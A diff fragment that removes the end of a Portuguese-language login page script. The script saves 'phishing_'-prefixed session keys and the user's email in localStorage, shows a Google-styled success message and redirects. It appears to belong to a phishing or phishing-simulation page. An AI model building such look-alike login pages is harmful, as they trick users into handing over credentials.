-                    // Marcar como logado no localStorage para cache offline
-                    localStorage.setItem('phishing_logged_in', 'true');
-                    localStorage.setItem('phishing_user_email', email);
-                    localStorage.setItem('phishing_login_time', new Date().toISOString());
-                    
-                    // Mostrar sucesso e redirecionar
-                    form.innerHTML = `
-                        <div style="text-align: center; padding: 40px 0;">
-                            <svg width="64" height="64" viewBox="0 0 24 24" fill="none">
-                                <circle cx="12" cy="12" r="12" fill="#34A853"/>
-                                <path d="M7 12l3 3 7-7" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                            </svg>
-                            <h2 style="margin-top: 20px; color: #202124; font-weight: 400;">Login efetuado!</h2>
-                            <p style="margin-top: 10px; color: #5f6368; font-size: 14px;">Redirecionando...</p>
-                        </div>
-                    `;
-                    
-                    // Registrar service worker para cache offline
-                    if ('serviceWorker' in navigator) {
-                        navigator.serviceWorker.register('/sw.js').catch(function(){});
-                    }
-                    
-                    // Redirecionar após 1 segundo
-                    setTimeout(function() {
-                        window.location.href = '/apos_login.html';
-                    }, 1000);
-                } else {
-                    errorEl.textContent = data.error || data.message || 'Erro ao fazer login';
-                    submitBtn.disabled = false;
-                    btnText.textContent = 'Login';
-                }
-            } catch (err) {
-                errorEl.textContent = 'Erro de conexão';
-                submitBtn.disabled = false;
-                btnText.textContent = 'Login';
-            }
-        });
-
-        passwordInput.addEventListener('input', () => {
-            if (passwordInput.value.length >= 8) {
-                passwordInput.style.borderColor = '#34A853';
-            } else {
-                passwordInput.style.borderColor = '#dadce0';
-            }
-        });
-    </script>
 </body>
 </html>
